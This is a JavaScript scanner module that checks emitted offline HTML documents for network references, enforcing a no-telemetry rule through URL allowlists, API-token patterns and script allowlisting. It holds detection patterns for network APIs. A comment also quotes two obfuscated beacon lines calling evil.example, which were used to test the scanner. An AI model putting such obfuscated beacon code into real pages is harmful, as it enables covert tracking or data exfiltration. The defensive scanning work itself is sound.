/**
 * The network-reference scanner (§13, §18.4, DECISIONS D10 and D14).
 *
 * §1.1 forbids telemetry of any kind in the artifact and calls it "a hard
 * product law, not a preference". §18.4 says the law is "verified at emit, not
 * asserted in a README". This module is where the claim becomes a check.
 *
 * It **parses rather than greps**. A literal grep for `http://`, `//` and
 * `src=` — the letter of §13 — fails every legal artifact: inline SVG carries a
 * namespace URI, every image is a `data:` URI with `src=`, and every base64
 * payload contains `//` by the thousand. D10 records why the allowlist exists
 * and exactly how narrow it is:
 *
 *   - `src` / `href` and their relatives must be `data:`, a document-internal
 *     `#` fragment, or `about:blank`. Nothing else. Not `mailto:`, not a
 *     relative path, not `javascript:`.
 *   - The three W3C namespace URIs are permitted as **exact whole strings**
 *     (D14) and nowhere else — not as the prefix of a longer URL.
 *   - Executable script is scanned with its comments and string literals
 *     masked, so §13's "outside of inert string literals" is implemented rather
 *     than assumed — while *URLs* inside literals are still caught, because a
 *     URL in a string is precisely how a beacon is written.
 *
 * What it deliberately does not flag: URLs in **visible text**. The artifact
 * presents the prospect's own content, and that content says `acme.com` all
 * over it. A browser never fetches a text node, and a scanner that failed on
 * one would be switched off within a day — which is how a law becomes a README
 * claim.
 *
 * @module emit/scan
 */

import { contentId } from '../core/ids.js';
import { base64Decode, utf8Decode } from '../core/bytes.js';
import { tokenizeHtml, maskJs, maskCss, lineColOf, excerptAt, decodeEntities } from './scan-parse.js';

/** D14: the only three absolute URLs that may appear in an artifact. */
export const W3C_NAMESPACES = Object.freeze([
  'http://www.w3.org/2000/svg',
  'http://www.w3.org/1999/xlink',
  'http://www.w3.org/1999/xhtml',
]);

/** The only URL forms an artifact may reference. */
export const URL_ALLOWLIST = Object.freeze(['data:', '#', 'about:blank']);

/** Attributes whose value is a URL. */
export const URL_ATTRS = new Set([
  'src', 'href', 'xlink:href', 'action', 'formaction', 'data', 'poster',
  'background', 'cite', 'ping', 'longdesc', 'manifest', 'codebase', 'archive',
  'profile', 'icon', 'dynsrc', 'lowsrc', 'usemap', 'xlink:xhref',
]);

/** Attributes carrying a comma-separated candidate list of URLs. */
export const SRCSET_ATTRS = new Set(['srcset', 'imagesrcset']);

/**
 * Attributes whose value is **prose**, not a reference.
 *
 * E8 already settled that a URL in visible text is not a network reference: a
 * browser never fetches a text node, the artifact presents the prospect's own
 * content, and that content says their domain all over it. An accessible name
 * is the same information delivered to a different sense — a screen reader
 * reads `aria-label` aloud exactly as a sighted viewer reads the paragraph
 * beside it — so classifying one as text and the other as a reference was an
 * inconsistency in this scanner, not a policy.
 *
 * It had a cost. L8 writes the accessible name for a `systemMap` as "…flowing
 * through https://… to 1 outputs", and the corpus proof could not be emitted:
 * the same URL passed in a `<p>` and refused the emit as the alt text for the
 * same diagram, with no override. A rule that makes the accessible version of
 * a scene less emittable than the inaccessible one is a rule that will get
 * layouts stripped of their alt text.
 *
 * Nothing here is relaxed for anything that fetches. Every attribute in
 * `URL_ATTRS` and `SRCSET_ATTRS`, every `data-*`, `style`, `on*`, `<meta>`
 * `content`, and every URL inside CSS or JavaScript stays exactly as strict as
 * D10 makes it — a `data-endpoint` holding a beacon URL is precisely the shape
 * §1.1 forbids. This set is closed, and every member of it is a string the HTML
 * specification defines as human-readable text that no user agent resolves.
 */
export const TEXT_ATTRS = new Set([
  'alt',
  'title',
  'label',
  'placeholder',
  'download',
  'abbr',
  'aria-label',
  'aria-description',
  'aria-placeholder',
  'aria-roledescription',
  'aria-valuetext',
  'aria-keyshortcuts',
]);

/** `<script type>` values a browser executes. */
const EXECUTABLE_SCRIPT_TYPES = new Set([
  '', 'text/javascript', 'application/javascript', 'text/ecmascript',
  'application/ecmascript', 'text/jscript', 'module', 'text/babel',
]);

/** `<script type>` values that name resources rather than run code. */
const RESOURCE_SCRIPT_TYPES = new Set(['importmap', 'speculationrules', 'systemjs-importmap']);

/**
 * Network APIs. Each entry is matched against script with comments and string
 * literals masked out, so the token has to be in code position to count.
 */
export const JS_NETWORK_TOKENS = [
  { re: /\bfetch\s*\(/g, what: 'fetch()' },
  { re: /\bfetchLater\s*\(/g, what: 'fetchLater()' },
  { re: /\bXMLHttpRequest\b/g, what: 'XMLHttpRequest' },
  { re: /\bWebSocket\b/g, what: 'WebSocket' },
  { re: /\bWebTransport\b/g, what: 'WebTransport' },
  { re: /\bEventSource\b/g, what: 'EventSource' },
  { re: /\bsendBeacon\b/g, what: 'navigator.sendBeacon' },
  { re: /\bimportScripts\s*\(/g, what: 'importScripts()' },
  { re: /\bserviceWorker\b/g, what: 'serviceWorker registration' },
  { re: /\bRTCPeerConnection\b/g, what: 'RTCPeerConnection' },
  { re: /\bwebkitRTCPeerConnection\b/g, what: 'webkitRTCPeerConnection' },
  { re: /\bmozRTCPeerConnection\b/g, what: 'mozRTCPeerConnection' },
  { re: /\bRTCDataChannel\b/g, what: 'RTCDataChannel' },
  { re: /\bnavigator\s*\.\s*connection\b/g, what: 'navigator.connection' },
  { re: /(^|[^.\w$])import\s*\(/g, what: 'dynamic import()' },
  { re: /\beval\s*\(/g, what: 'eval()' },
  { re: /\bnew\s+Function\s*\(/g, what: 'new Function()' },
];

/**
 * Any absolute URL, in any syntax.
 *
 * The scheme is bounded at 32 characters, and that bound is load-bearing rather
 * than cosmetic. Unbounded (`[a-zA-Z0-9+.\-]*`), the engine restarts the greedy
 * scheme run at every position of every alphanumeric string in the document,
 * looking for a `://` that is not there — quadratic, and a document is exactly
 * where long alphanumeric strings live. A 485KB base64 font in a `src: url(...)`
 * took `scanCss` **166 seconds**, so a seller who attached four licensed weights
 * watched the studio hang before being told the artifact was over budget (P4).
 * Bounded, the same scan is milliseconds.
 *
 * Nothing is given up for it. The longest scheme IANA has registered is 20
 * characters; a base64 body cannot contain a `:` at all, so it cannot hide a
 * scheme; and no engine resolves a 33-character scheme, so a URL behind one is
 * not a URL anything would fetch. `test/emit/scanner.test.mjs` asserts both the
 * long-scheme case and the run-of-letters case.
 */
const ABSOLUTE_URL_RE = /[a-zA-Z][a-zA-Z0-9+.\-]{0,31}:\/\/[^\s"'`)>\]<]*/g;

/**
 * Is a URL one of the three the artifact may carry, whole?
 * @param {string} value
 * @returns {boolean}
 */
export function isW3cNamespace(value) {
  return W3C_NAMESPACES.includes(String(value).trim());
}

/**
 * Classify a URL attribute value against the D10 allowlist.
 * @param {string} raw
 * @returns {{ok: true} | {ok: false, reason: string}}
 */
export function classifyUrl(raw) {
  const value = String(raw == null ? '' : raw).trim();
  if (value === '') return { ok: true };
  const lower = value.toLowerCase();
  if (lower.startsWith('data:')) return { ok: true };
  if (value.startsWith('#')) return { ok: true };
  if (lower === 'about:blank') return { ok: true };
  if (lower.startsWith('//')) return { ok: false, reason: 'protocol-relative URL' };
  const scheme = /^([a-zA-Z][a-zA-Z0-9+.\-]*):/.exec(value);
  if (scheme) {
    const s = scheme[1].toLowerCase();
    if (s === 'javascript') return { ok: false, reason: 'javascript: URL' };
    if (s === 'http' || s === 'https') return { ok: false, reason: 'absolute URL' };
    if (s === 'blob' || s === 'filesystem') return { ok: false, reason: `${s}: URL` };
    return { ok: false, reason: `${s}: URL` };
  }
  return { ok: false, reason: 'relative URL — resolved against the document, which is a fetch' };
}

/**
 * Build a deterministic `Finding`.
 * @param {object} args
 * @param {string} args.message
 * @param {Record<string, unknown>} args.locus
 * @returns {import('../core/contracts.d.ts').Finding}
 */
export function networkFinding({ message, locus }) {
  return {
    id: contentId('finding', { code: 'NETWORK_REFERENCE', message, locus }),
    severity: 1,
    code: 'NETWORK_REFERENCE',
    message,
    locus,
    autoFixAvailable: false,
  };
}

/**
 * Scan a complete document for anything that could reach the network.
 *
 * @param {string} html   the emitted document, or any fragment of it
 * @param {object} [options]
 * @param {string} [options.where]      a label for the locus, e.g. a scene id
 * @param {Record<string, unknown>} [options.locus]  extra locus fields merged into every finding
 * @returns {import('../core/contracts.d.ts').Finding[]}
 */
export function scanForNetworkReferences(html, options = {}) {
  const src = String(html == null ? '' : html);
  const baseLocus = options.locus || {};
  const where = options.where || 'document';
  /** @type {import('../core/contracts.d.ts').Finding[]} */
  const findings = [];

  /**
   * @param {string} message
   * @param {number} index
   * @param {Record<string, unknown>} [extra]
   */
  const hit = (message, index, extra = {}) => {
    const { line, column } = lineColOf(src, index);
    findings.push(networkFinding({
      message,
      locus: { ...baseLocus, where, line, column, excerpt: excerptAt(src, index), ...extra },
    }));
  };

  const tokens = tokenizeHtml(src);

  for (const token of tokens) {
    if (token.kind === 'tag') {
      scanTag(token, src, hit);
      continue;
    }
    if (token.kind === 'rawtext') {
      if (token.parent === 'style') {
        for (const f of scanCss(token.text, { offset: token.index })) hit(f.message, f.index, { in: '<style>' });
        continue;
      }
      if (token.parent === 'script') {
        const owner = lastTagBefore(tokens, token, 'script');
        const type = (owner ? attrValue(owner, 'type') : '') || '';
        const normalized = type.trim().toLowerCase().split(';')[0];
        if (RESOURCE_SCRIPT_TYPES.has(normalized)) {
          hit(`<script type="${normalized}"> names resources by URL and cannot appear in an offline artifact`, token.index, { in: '<script>' });
          continue;
        }
        if (EXECUTABLE_SCRIPT_TYPES.has(normalized)) {
          for (const f of scanJs(token.text, { offset: token.index })) hit(f.message, f.index, { in: '<script>' });
        } else {
          // An inert block cannot execute, so its identifiers are harmless, but
          // a URL inside one is still a URL somebody put in the file on purpose.
          for (const f of scanAbsoluteUrls(token.text, token.index)) hit(f.message, f.index, { in: `<script type="${normalized}">` });
        }
      }
    }
  }

  return findings;
}

/**
 * The script elements `emit/document.js` writes, and the `type` each one
 * carries. Nothing else belongs in an artifact.
 */
export const EMITTED_SCRIPTS = Object.freeze({
  'pp-model': 'application/octet-stream',
  'pp-media': 'application/octet-stream',
  'pp-manifest': 'application/json',
  'pp-runtime': '',
  'pp-boot': '',
});

/**
 * Every script element in the document that the emitter did not write (C16).
 *
 * The scanner reads inline script as code and catches the network APIs by name,
 * with comments and string literals masked so a token has to be in code
 * position. It caught twenty-six of the §20 critic's twenty-seven planted
 * references, `window["fe"+"tch"]("htt"+"ps://evil.example/x")` included. The
 * twenty-seventh was this:
 *
 * ```js
 * new (window[atob("V2ViU29ja2V0")])(atob("d3NzOi8vZXZpbC5leGFtcGxlL3M="))
 * ```
 *
 * No token, no URL, nothing to match. The obvious answer — decode base64
 * literals and rescan — is recorded and rejected in `docs/decisions/L10-emit.md`
 * (E33): it buys one encoding out of an unbounded set, and `atob` is a thing
 * the artifact's own decoder calls, so the rule that would catch this pattern
 * is a rule that fires on the artifact.
 *
 * This is the answer that does not depend on how the payload is spelled. An
 * artifact's executable code is the runtime bundle and its boot script, both
 * written by the emitter from strings the emitter was given. Any other script
 * element is prospect content that has become code, and code the emitter did not
 * write is code it cannot show makes no network call — which is the whole of
 * what §18.4 says it must show. So it is reported, at severity 1, and the
 * question of what the code is obfuscating never has to be asked.
 *
 * Reported as `NETWORK_REFERENCE` because that is §18.4's code and this is
 * §18.4's law; §4 fixes the set of codes and inventing a fourteenth to describe
 * one route to the same failure would not help anyone reading the report.
 *
 * @param {string} html
 * @param {object} [options]
 * @param {Record<string, string>} [options.allowed]  id → expected `type`; default none
 * @param {string} [options.where]
 * @param {Record<string, unknown>} [options.locus]
 * @returns {import('../core/contracts.d.ts').Finding[]}
 */
export function scanForeignScripts(html, options = {}) {
  const src = String(html == null ? '' : html);
  const allowed = options.allowed || {};
  const baseLocus = options.locus || {};
  const where = options.where || 'document';
  /** @type {import('../core/contracts.d.ts').Finding[]} */
  const findings = [];
  /** @type {Set<string>} */
  const seen = new Set();

  for (const token of tokenizeHtml(src)) {
    if (token.kind !== 'tag' || token.name !== 'script') continue;
    const id = (attrValue(token, 'id') || '').trim();
    const type = (attrValue(token, 'type') || '').trim().toLowerCase().split(';')[0];
    const expected = Object.prototype.hasOwnProperty.call(allowed, id) ? allowed[id] : null;

    let problem = null;
    if (expected === null) {
      problem = id
        ? `<script id="${id}"> is not one of the elements the emitter writes`
        : 'a script element with no id, and the emitter writes none';
    } else if (type !== expected) {
      problem = `<script id="${id}"> carries type="${type || ''}" where the emitter writes type="${expected}"`;
    } else if (seen.has(id)) {
      problem = `a second <script id="${id}">, and the artifact boots from the first`;
    }
    if (expected !== null) seen.add(id);
    if (!problem) continue;

    const { line, column } = lineColOf(src, token.index);
    findings.push(networkFinding({
      message: `${problem}. An artifact's executable code is the runtime bundle and its boot script and nothing else — `
        + 'script the emitter did not write is script it cannot show makes no network call, however it is spelled (§18.4).',
      locus: { ...baseLocus, where, line, column, excerpt: excerptAt(src, token.index) },
    }));
  }

  return findings;
}

/**
 * @param {import('./scan-parse.js').HtmlToken[]} tokens
 * @param {import('./scan-parse.js').HtmlToken} rawToken
 * @param {string} name
 * @returns {import('./scan-parse.js').HtmlToken|null}
 */
function lastTagBefore(tokens, rawToken, name) {
  let found = null;
  for (const t of tokens) {
    if (t === rawToken) break;
    if (t.kind === 'tag' && t.name === name) found = t;
  }
  return found;
}

/**
 * @param {import('./scan-parse.js').HtmlToken} tag
 * @param {string} name
 * @returns {string|null}
 */
function attrValue(tag, name) {
  const a = tag.attrs.find((x) => x.name === name);
  return a ? a.value : null;
}

/**
 * @param {import('./scan-parse.js').HtmlToken} tag
 * @param {string} src
 * @param {(message: string, index: number, extra?: Record<string, unknown>) => void} hit
 */
function scanTag(tag, src, hit) {
  const el = tag.name;

  // D10 names these two outright, whatever they point at.
  if (el === 'link') {
    const rel = (attrValue(tag, 'rel') || '').toLowerCase();
    const relTokens = rel.split(/\s+/).filter(Boolean);
    const fetching = ['stylesheet', 'preload', 'prefetch', 'preconnect', 'dns-prefetch', 'modulepreload', 'manifest', 'prerender', 'import'];
    for (const r of relTokens) {
      if (fetching.includes(r)) {
        hit(`<link rel="${r}"> asks the browser to fetch a resource; an artifact has no resources to fetch (D10)`, tag.index, { element: 'link', rel: r });
      }
    }
  }
  if (el === 'script') {
    const srcAttr = tag.attrs.find((a) => a.name === 'src');
    if (srcAttr) hit('<script src> loads code from outside the document', srcAttr.index, { element: 'script', attribute: 'src' });
  }
  if (el === 'base') {
    hit('<base> rewrites how every relative URL in the document resolves and has no place in a self-contained artifact', tag.index, { element: 'base' });
  }
  if (el === 'meta') {
    const equiv = (attrValue(tag, 'http-equiv') || '').toLowerCase();
    if (equiv === 'refresh') {
      const content = attrValue(tag, 'content') || '';
      const m = /url\s*=\s*(.+)$/i.exec(content);
      const target = m ? m[1].trim().replace(/^['"]|['"]$/g, '') : '';
      if (target) {
        const verdict = classifyUrl(target);
        if (!verdict.ok) {
          const a = tag.attrs.find((x) => x.name === 'content');
          hit(`meta refresh navigates to ${describe(target)} (${verdict.reason})`, a ? a.valueIndex : tag.index, { element: 'meta', attribute: 'content' });
        }
      }
    }
  }

  for (const attr of tag.attrs) {
    const name = attr.name;

    // Namespace declarations: D14's three strings, exactly, and nothing else.
    if (name === 'xmlns' || name.startsWith('xmlns:')) {
      if (!isW3cNamespace(attr.value)) {
        hit(`${name}="${truncate(attr.value)}" is not one of the three W3C namespace URIs D14 permits`, attr.valueIndex, { element: el, attribute: name });
      }
      continue;
    }

    if (SRCSET_ATTRS.has(name)) {
      for (const candidate of parseSrcset(attr.value)) {
        const verdict = classifyUrl(candidate);
        if (!verdict.ok) {
          hit(`${el}[${name}] candidate ${describe(candidate)} (${verdict.reason})`, attr.valueIndex, { element: el, attribute: name });
        }
      }
      continue;
    }

    if (URL_ATTRS.has(name)) {
      const verdict = classifyUrl(attr.value);
      if (!verdict.ok) {
        hit(`${el}[${name}]=${describe(attr.value)} (${verdict.reason})`, attr.valueIndex, { element: el, attribute: name });
      } else if (el === 'use' && (name === 'href' || name === 'xlink:href')) {
        if (attr.value.trim() && !attr.value.trim().startsWith('#')) {
          hit(`<use ${name}> must point at a fragment inside this document`, attr.valueIndex, { element: 'use', attribute: name });
        }
      }
      if (attr.value.trim().toLowerCase().startsWith('data:')) {
        for (const f of scanNestedDataUri(attr.value)) hit(`${f} (inside ${el}[${name}] data: URI)`, attr.valueIndex, { element: el, attribute: name });
      }
      continue;
    }

    if (name === 'style') {
      for (const f of scanCss(attr.value, { offset: attr.valueIndex, declarationsOnly: true })) {
        hit(`${f.message} (in a style attribute on <${el}>)`, attr.valueIndex, { element: el, attribute: 'style' });
      }
      continue;
    }

    if (name.startsWith('on') && name.length > 2) {
      for (const f of scanJs(attr.value, { offset: attr.valueIndex })) {
        hit(`${f.message} (in ${el}[${name}])`, attr.valueIndex, { element: el, attribute: name });
      }
      continue;
    }

    // Prose is prose, wherever it is delivered. See `TEXT_ATTRS`.
    if (TEXT_ATTRS.has(name)) continue;

    // The catch-all: any other attribute that carries an absolute URL. A
    // `data-*` attribute holding a beacon endpoint is exactly the shape §1.1
    // forbids, even though no attribute of that name fetches on its own.
    for (const f of scanAbsoluteUrls(attr.value, attr.valueIndex)) {
      hit(`${f.message} (in ${el}[${name}])`, f.index, { element: el, attribute: name });
    }
  }
}

/**
 * `srcset` candidates: `url descriptor, url descriptor, …`.
 *
 * Splitting on commas is wrong, because a `data:` URI contains one. The HTML
 * specification reads a candidate as a run of non-whitespace followed by an
 * optional descriptor, and that is what this does — so a legal `srcset` of two
 * base64 images parses as two images rather than four fragments.
 *
 * @param {string} value
 * @returns {string[]}
 */
export function parseSrcset(value) {
  const s = String(value == null ? '' : value);
  /** @type {string[]} */
  const out = [];
  let i = 0;
  while (i < s.length) {
    while (i < s.length && /[\s,]/.test(s[i])) i++;
    const start = i;
    while (i < s.length && !/\s/.test(s[i])) i++;
    let url = s.slice(start, i).replace(/,+$/, '');
    if (url) {
      if (url.includes(',') && !/^data:/i.test(url)) out.push(...url.split(',').filter(Boolean));
      else out.push(url);
    }
    while (i < s.length && s[i] !== ',') i++;
  }
  return out;
}

/**
 * Absolute URLs anywhere in a string, minus D14's three exact strings.
 * @param {string} text
 * @param {number} offset
 * @returns {{message: string, index: number}[]}
 */
export function scanAbsoluteUrls(text, offset = 0) {
  const s = String(text == null ? '' : text);
  /** @type {{message: string, index: number}[]} */
  const out = [];
  ABSOLUTE_URL_RE.lastIndex = 0;
  let m;
  while ((m = ABSOLUTE_URL_RE.exec(s)) !== null) {
    const url = m[0];
    if (W3C_NAMESPACES.includes(url)) continue;
    const prefixed = W3C_NAMESPACES.find((ns) => url.startsWith(ns));
    const note = prefixed
      ? `${describe(url)} extends the W3C namespace ${prefixed}; D14 permits those three strings whole and never as a prefix`
      : `absolute URL ${describe(url)}`;
    out.push({ message: note, index: offset + m.index });
  }
  return out;
}

/**
 * Scan CSS for anything that loads.
 * @param {string} css
 * @param {object} [options]
 * @param {number} [options.offset]
 * @param {boolean} [options.declarationsOnly]
 * @returns {{message: string, index: number}[]}
 */
export function scanCss(css, options = {}) {
  const offset = options.offset || 0;
  const src = String(css == null ? '' : css);
  const masked = maskCss(src).code;
  /** @type {{message: string, index: number}[]} */
  const out = [];

  const importRe = /@import\b/g;
  let m;
  while ((m = importRe.exec(masked)) !== null) {
    out.push({ message: '@import pulls in a stylesheet the artifact does not contain', index: offset + m.index });
  }

  const bindingRe = /(^|[\s;{])(behavior|-moz-binding)\s*:/g;
  while ((m = bindingRe.exec(masked)) !== null) {
    out.push({ message: `${m[2]} loads code by URL`, index: offset + m.index });
  }

  const urlRe = /url\s*\(/gi;
  while ((m = urlRe.exec(masked)) !== null) {
    const open = m.index + m[0].length;
    let depth = 1;
    let j = open;
    for (; j < masked.length; j++) {
      if (masked[j] === '(') depth++;
      else if (masked[j] === ')') { depth--; if (depth === 0) break; }
    }
    let value = src.slice(open, j).trim();
    if ((value[0] === '"' && value.endsWith('"')) || (value[0] === "'" && value.endsWith("'"))) value = value.slice(1, -1);
    value = decodeEntities(value).trim();
    if (value === '') continue;
    const verdict = classifyUrl(value);
    if (!verdict.ok) {
      out.push({ message: `CSS url(${describe(value)}) is not a data: URI or a document fragment (${verdict.reason})`, index: offset + m.index });
    } else if (value.toLowerCase().startsWith('data:')) {
      for (const f of scanNestedDataUri(value)) out.push({ message: `${f} (inside a CSS data: URI)`, index: offset + m.index });
    }
  }

  const imageSetRe = /(-webkit-)?image-set\s*\(/gi;
  while ((m = imageSetRe.exec(masked)) !== null) {
    const open = m.index + m[0].length;
    const close = masked.indexOf(')', open);
    const inner = src.slice(open, close < 0 ? src.length : close);
    for (const part of inner.split(',')) {
      const token = part.trim().split(/\s+/)[0].replace(/^["']|["']$/g, '');
      if (!token || /^url\s*\(/i.test(token)) continue;      // url() already handled above
      const verdict = classifyUrl(token);
      if (!verdict.ok) out.push({ message: `image-set(${describe(token)}) (${verdict.reason})`, index: offset + m.index });
    }
  }

  // Absolute URLs anywhere else in the sheet, including inside `src:` lists.
  // Comments are masked first: a URL nobody can reach is not a reference.
  for (const f of scanAbsoluteUrls(masked, offset)) {
    if (!out.some((existing) => Math.abs(existing.index - f.index) < 8)) out.push(f);
  }

  if (options.declarationsOnly) { /* nothing further; an attribute has no at-rules of its own */ }
  return out;
}

/**
 * Scan JavaScript. Comments and literals are masked before the API scan (§13's
 * "outside of inert string literals"); the URL scan runs over everything,
 * because a URL in a string literal is not inert — it is a destination.
 * @param {string} js
 * @param {object} [options]
 * @param {number} [options.offset]
 * @returns {{message: string, index: number}[]}
 */
export function scanJs(js, options = {}) {
  const offset = options.offset || 0;
  const src = String(js == null ? '' : js);
  const masked = maskJs(src);
  /** @type {{message: string, index: number}[]} */
  const out = [];

  for (const { re, what } of JS_NETWORK_TOKENS) {
    re.lastIndex = 0;
    let m;
    while ((m = re.exec(masked.code)) !== null) {
      const at = m.index + (m[0].length - m[0].replace(/^[^\w$]/, '').length);
      out.push({ message: `${what} in artifact script`, index: offset + at });
    }
  }

  // URLs in code position, and URLs inside string literals. Comments are
  // excluded on purpose: a URL in a comment is unreachable by construction, and
  // failing on one would put the law at war with the documentation that
  // explains it.
  for (const f of scanAbsoluteUrls(masked.code, offset)) out.push(f);
  for (const lit of masked.literals) {
    for (const f of scanAbsoluteUrls(lit.value, 0)) out.push({ message: f.message, index: offset + lit.start });
  }

  // A protocol-relative URL cannot be seen by the absolute-URL scan, and in JS
  // `//` is otherwise a comment — so it is only meaningful inside a literal.
  for (const lit of masked.literals) {
    const value = lit.value.trim();
    if (value.startsWith('//') && value.length > 2 && !value.startsWith('///')) {
      out.push({ message: `protocol-relative URL "${truncate(value)}" in a string literal`, index: offset + lit.start });
    }
  }

  return out;
}

/**
 * Recurse into a `data:` URI whose payload is itself markup. An SVG or an HTML
 * data URI can carry its own `<image href="https://…">`, and that fetches.
 * @param {string} uri
 * @returns {string[]}
 */
export function scanNestedDataUri(uri) {
  const s = String(uri);
  const comma = s.indexOf(',');
  if (comma < 0) return [];
  const header = s.slice(5, comma).toLowerCase();
  const mime = header.split(';')[0] || 'text/plain';
  if (!['image/svg+xml', 'text/html', 'application/xhtml+xml', 'text/xml', 'application/xml', 'text/css'].includes(mime)) return [];
  const isBase64 = /;base64/.test(header);
  let body = '';
  try {
    body = isBase64 ? utf8Decode(base64Decode(s.slice(comma + 1))) : decodeURIComponent(s.slice(comma + 1));
  } catch {
    return [];
  }
  if (body.length > 2_000_000) body = body.slice(0, 2_000_000);
  if (mime === 'text/css') return scanCss(body).map((f) => f.message);
  return scanForNetworkReferences(body, { where: 'data: URI' }).map((f) => f.message);
}

/** @param {string} s @returns {string} */
function truncate(s, n = 96) {
  const t = String(s).replace(/\s+/g, ' ').trim();
  return t.length > n ? `${t.slice(0, n)}…` : t;
}

/** @param {string} s @returns {string} */
function describe(s) {
  return `"${truncate(s)}"`;
}

/**
 * Scan the **model's** assets, not just the rendered document.
 *
 * A `MediaRef.dataUri` holding `https://cdn.example/hero.png` never reaches the
 * artifact: a layout that only renders `data:` sources skips it, and the
 * document scan then finds nothing to report. That is the right outcome for the
 * network law and the wrong outcome for the seller, who walks into the room
 * with a hero image that is simply gone. §13 says degradation is never silent
 * and §20 axis 9 scores exactly that honesty, so a model asset that is not
 * inlined is reported here, at severity 1, whether or not any layout tried to
 * render it.
 *
 * §4 settles which finding it is: `MediaRef.dataUri` is documented "always
 * inlined by emit time", so a URL in that field is not a missing asset, it is
 * an instruction to fetch — `NETWORK_REFERENCE`, the same as if it had reached
 * the document.
 *
 * Two things this deliberately does not flag, because neither is an instruction
 * to fetch anything:
 *
 *   - `Specimen.sourceUrl`, `BrandSystem.sourceUrl` and a `cta` block's `href`.
 *     Those record where the prospect's own content came from. They are data
 *     about a capture, they render as text or as nothing, and no user agent
 *     resolves them. The document scan still catches a layout that turns one
 *     into a live `<a href>`.
 *   - A `raw` content block that was never opted in. §8 requires a per-specimen
 *     opt-in before raw HTML is presented at all, so an un-opted block is not
 *     part of the artifact; if it is opted in and rendered, the per-scene
 *     document scan sees it.
 *
 * **`nestedOnly`.** L11's `NETWORK_REFERENCE` rule now owns the "this asset was
 * never inlined" case for media and logos, and `emit()` runs that rule (see
 * `emit/gate.js`). Reporting the same asset from both would be one defect
 * described twice, so the emit path asks for `nestedOnly` and keeps only the
 * question the rule does not ask: whether an asset that *is* inlined carries a
 * network reference inside it — a base64 SVG with an `<image href="https://…">`
 * in it, which no check of the URI's scheme can see.
 *
 * @param {import('../core/contracts.d.ts').Proof} proof
 * @param {object} [options]
 * @param {boolean} [options.nestedOnly]  only look inside inlined assets
 * @returns {import('../core/contracts.d.ts').Finding[]}
 */
export function scanModelAssets(proof, options = {}) {
  const nestedOnly = options.nestedOnly === true;
  /** @type {import('../core/contracts.d.ts').Finding[]} */
  const out = [];
  if (!proof || typeof proof !== 'object') return out;

  /**
   * @param {string} value
   * @param {string} what
   * @param {Record<string, unknown>} locus
   */
  const checkInlined = (value, what, locus) => {
    const uri = String(value == null ? '' : value).trim();
    if (uri === '') {
      if (nestedOnly) return;
      out.push(networkFinding({
        message: `${what} carries no inlined data. §4 requires every asset to be inlined by emit time; an empty reference renders as nothing and the presenter finds out in the room.`,
        locus,
      }));
      return;
    }
    if (uri.toLowerCase().startsWith('data:')) {
      for (const message of scanNestedDataUri(uri)) {
        out.push(networkFinding({ message: `${what}: ${message}`, locus }));
      }
      return;
    }
    if (nestedOnly) return;
    const verdict = classifyUrl(uri);
    out.push(networkFinding({
      message: `${what} is ${describe(uri)} rather than an inlined data: URI (${verdict.ok ? 'not a data: URI' : verdict.reason}). `
        + '§4 says an asset is "always inlined by emit time", so this is a fetch the artifact would have to perform — '
        + 'and because it cannot, the asset would silently not appear at all.',
      locus,
    }));
  };

  for (const logo of (proof.brand && proof.brand.logos) || []) {
    const data = String(logo.data == null ? '' : logo.data).trim();
    const locus = { assetId: logo.id };
    if (data.startsWith('<')) {
      // §4: a logo is "inline SVG markup or data URI". Markup gets the full
      // document scan, so a sanitised-away <image href="https://…"> is reported
      // rather than quietly removed. L11's rule reads inline SVG logos too, so
      // in `nestedOnly` mode this is left to it.
      if (!nestedOnly) {
        for (const finding of scanForNetworkReferences(data, { where: `logo ${logo.id}`, locus })) out.push(finding);
      }
      continue;
    }
    checkInlined(data, `Logo "${logo.variant}" (${logo.id})`, locus);
  }

  for (const specimen of proof.specimens || []) {
    for (const ref of specimen.media || []) {
      checkInlined(ref.dataUri, `Media "${ref.alt || ref.id}" on specimen ${specimen.id}`, { assetId: ref.id, specimenId: specimen.id });
    }
  }
  for (const rendition of proof.renditions || []) {
    for (const ref of rendition.media || []) {
      checkInlined(ref.dataUri, `Media "${ref.alt || ref.id}" on rendition ${rendition.id}`, { assetId: ref.id, specimenId: rendition.specimenId });
    }
  }
  return out;
}
